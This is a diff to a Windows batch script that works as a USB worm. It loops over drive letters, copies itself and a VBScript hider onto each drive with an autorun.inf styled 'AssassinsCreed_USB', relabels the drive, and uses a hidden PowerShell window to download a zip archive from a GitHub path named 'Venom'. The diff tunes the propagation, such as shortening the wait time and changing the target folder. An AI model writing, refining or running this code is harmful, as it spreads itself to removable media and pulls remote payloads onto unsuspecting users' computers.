@@ -27,7 +27,7 @@ goto check_drive
 for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
         @rem Wait for 10 minutes before changing the USB label
-        timeout /t 600 >nul
+        timeout /t 100 >nul
 
         @rem Generate a random letter using PowerShell
         for /f %%i in ('PowerShell -Command "[char]([byte](Get-Random -Minimum 65 -Maximum 90))"') do set randomLetter=%%i
@@ -36,8 +36,8 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
         label %%d: U$B_%randomLetter%
 
         md "%%d:\system info"
-        attrib +h "%%d:\system info"
-        copy "%~f0" "%%d:\system info\AutoRun.cmd"
+        @rem attrib +h "%%d:\system info"
+        copy "%~f0" "%%d:\system info\AutoRun.bat"
         copy "RunHidden.vbs" "%%d:\system info\RunHidden.vbs"
         echo [autorun] > "%%d:\system info\autorun.inf"
         echo label=AssassinsCreed_USB >> "%%d:\system info\autorun.inf"
@@ -51,7 +51,7 @@ call :check_internet
 
 powershell.exe -windowstyle hidden -Command "Invoke-WebRequest -Uri 'https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip' -OutFile 'AssassinsCreed_SE.zip'"
 
-set desktop=C:\Users\%USERNAME%\Desktop
+set desktop=C:\Users\%USERNAME%\Downloads
 set wd=%CD%
 
 cd %wd%
